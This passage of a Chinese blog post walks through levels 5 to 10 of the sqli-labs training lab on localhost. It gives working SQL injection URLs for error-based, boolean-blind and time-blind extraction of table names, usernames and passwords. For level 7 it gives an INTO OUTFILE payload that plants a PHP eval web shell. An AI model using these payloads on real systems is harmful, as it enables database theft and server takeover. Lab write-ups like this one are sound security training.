<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-8.png" alt="5-8"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) --+</span><br><span class="line"></span><br><span class="line">//爆表名称，同样改变limit的变量去看每个表</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-9.png" alt="5-9"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-10.png" alt="5-10"></p>
<p>（3）延时注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br><span class="line">//马上返回内容</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;s&apos;),1,sleep(5)) --+</span><br><span class="line">//等待了5秒后，返回空白</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and if((substr(database(),1,8)=&apos;security&apos;),1,sleep(5)) --+</span><br><span class="line">//马上返回内容</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-11.png" alt="5-11"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-12.png" alt="5-12"></p>
<hr>
<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less - 6"></a>Less - 6</h2><p>第6关与第5关不同就是对参数ID的处理不同了，变成<strong>一个双引号</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/6-1.png" alt="6-1"></p>
<p>我们使用xpath报错注入试一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot; and extractvalue(1,concat(0x3a,(select username from users where id=2),0x3a)) --+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot; and extractvalue(1,concat(0x3a,(select password from users where id=2),0x3a)) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/6-2.png" alt="6-2"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/6-3.png" alt="6-3"></p>
<p>其他的内容和第5关一样，只是<strong>单引号</strong>改成<strong>双引号</strong>，这里就不再赘述了</p>
<hr>
<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less - 7"></a>Less - 7</h2><p>这关接触到了<strong>dump into outfile</strong>。关于这部分知识点可以看这篇博客的Tip 3部分：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a></p>
<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>可以看出来这里对ID的处理是<strong>((‘id’))</strong>，那么我们就可以使用<strong>1’)) or 1=1 –+</strong>进行注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-7/?id=1&apos;)) or 1=1--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-1.png" alt="7-1"></p>
<p>那么我们现在就可以通过<strong>文件导入</strong>的方式写入文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-7/?id=-1&apos;)) union select 1,2,3 into outfile &quot;C:\\phpstudy\\WWW\\AAsqli-labs\\Less-7\\HSW.php&quot; --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-2.png" alt="7-2"></p>
<p>可以看到虽然提示语法错误，但是我们这个<strong>HSW.php</strong>文件是已经写入的了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-3.png" alt="7-3"></p>
<p>可以访问一下</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-4.png" alt="7-4"></p>
<p>既然是可以成功写入的，那么我们就可以把写入的内容换成<strong>一句话木马</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-7/?id=-1&apos;)) union select 1,2,&apos;&lt;?php @eval($_post[&quot;HSW&quot;])?&gt;&apos; into outfile &quot;C:\\phpstudy\\WWW\\AAsqli-labs\\Less-7\\HSW2.php&quot; --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-5.png" alt="7-5"></p>
<p>注意：</p>
<ol>
<li>这里要写入的文件必须是之前没有的，如果我这里还是使用<strong>HSW.php</strong>，那么一句话木马是不会写入的。只有改成不存在的文件名，如<strong>HSW2.php</strong>才行</li>
<li>我们这里用一句话代替之前3的位置，要加上2个<strong>单引号</strong>把语句括起来</li>
</ol>
<p>我们也是可以访问一下这个<strong>HSW2.php</strong>文件，看有没有导入成功。结果看来是有的</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-6.png" alt="7-6"></p>
<p>这是就可以用<strong>蚁剑</strong>或者<strong>菜刀</strong>等等工具去连接</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-7.png" alt="7-7"></p>
<hr>
<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less - 8"></a>Less - 8</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-1.png" alt="8-1"></p>
<p>此时我们发现和之前不同的是，没有报错信息了！怎么办？根据之前的经验，我们配合<strong>or 1=1 –+</strong> 进行尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; or 1=1 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-2.png" alt="8-2"></p>
<p>嗯？返回正常结果了，那我们就可以猜，原文件对<strong>ID</strong>的处理只是简单的<strong>单引号</strong></p>
<p>查看 <strong>index.php</strong> 文件，和我们猜想的一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>那么这关也是使用盲注，但是却只能用<strong>布尔注入</strong>和<strong>延时注入</strong></p>
<p>这关<strong>报错注入无法使用</strong></p>
<p><strong>布尔注入</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and substr(database(),1,1)&gt;&apos;a&apos; --+</span><br><span class="line"></span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and substr(database(),1,1)&gt;&apos;s&apos; --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-3.png" alt="8-3"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-4.png" alt="8-4"></p>
<p><strong>延时注入</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">立即返回：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">等待5秒：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;s&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-5.png" alt="8-5"></p>
<p><strong>报错注入（无法使用）</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and extractvalue(1,concat(0x3a,(select database()),0x3a)) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-6.png" alt="8-6"></p>
<hr>
<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less - 9"></a>Less - 9</h2><p>题目的标题是<strong>Blind- Time based- Single Quotes</strong>，翻译就是<strong>盲注—基于时间—单引号</strong></p>
<p>那么我们就根据提示去做题了</p>
<p>从源代码我们可以看出，不管你做什么，它都只返回<strong>You are in ……..</strong></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/9-1.png" alt="9-1"></p>
<p><strong>爆数据库名</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">立即返回：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">等待5秒：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;s&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/9-2.png" alt="9-2"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/9-3.png" alt="9-3"></p>
<p>从上面这2张图我们也可以看出，不管输入什么都只返回<strong>You are in ……..</strong>，所以只能根据<strong>响应时间</strong>来判断</p>
<p>……</p>
<p>不断尝试之后，我们知道数据库名是<strong>security</strong></p>
<p><strong>爆security数据库下的表名</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)&gt;&apos;e&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第二个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),1,1)&gt;&apos;r&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第三个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 2,1),1,1)&gt;&apos;u&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第四个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 2,1),1,1)&gt;&apos;u&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
<p>慢慢地爆出security下的表名：emails，referers，uagents，users</p>
<p><strong>爆users表下的列名</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)&gt;&apos;i&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第二列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1),1,1)&gt;&apos;u&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第三列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),1,1)&gt;&apos;p&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
<p>慢慢地爆出users下的列名：id，username，password</p>
<p><strong>爆users表下的username列的数据</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一行：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select username from users limit 0,1),1,1)&gt;&apos;d&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
<p>爆出第一行的数据是dumb</p>
<hr>
<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less - 10"></a>Less - 10</h2><p>题目的标题是<strong>Blind- Time based- Double Quotes</strong>，翻译就是<strong>盲注—基于时间—双引号</strong></p>
<p>那么这关和第9关的差别就只是<strong>单引号</strong>和<strong>双引号</strong>的问题了</p>
<p>就不再赘述了，可以自己去尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-10/?id=1&quot; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/10-1.png" alt="10-1"></p>
<hr>
<h3 id="至此，1-10关的Write-up结束"><a href="#至此，1-10关的Write-up结束" class="headerlink" title="至此，1-10关的Write-up结束"></a>至此，1-10关的Write-up结束</h3><h3 id="后一部分链接：第11-20关Write-up"><a href="#后一部分链接：第11-20关Write-up" class="headerlink" title="后一部分链接：第11-20关Write-up"></a>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/30/Sqli-labs%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></h3>

                
            </div>

            <!-- Comments -->
            
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    


                </div>
            
        </div>
    </div>
</article>

    <!-- Footer -->
    <hr>

<!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                    

                    

                    
                        <li>
                            <a href="https://github.com/Knlvre" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    

                    

                    
                </ul>
                <p class="copyright text-muted">&copy; 2019 Huang-ShuWei(Knlvre)<br></p>
                <p class="copyright text-muted"> Theme by <a href="http://startbootstrap.com/template-overviews/clean-blog/" target="_blank"> Clean Blog </a> from <a href="http://startbootstrap.com/" target="_blank"> Start Bootstrap </a> re-Ported by <a href="https://github.com/Knlvre" target="_blank"> Knlvre </a></p>
            </div>
        </div>
    </div>
</footer>


    <!-- After footer scripts -->
    
<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Bootstrap -->
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Disqus Comments -->



</body>

</html>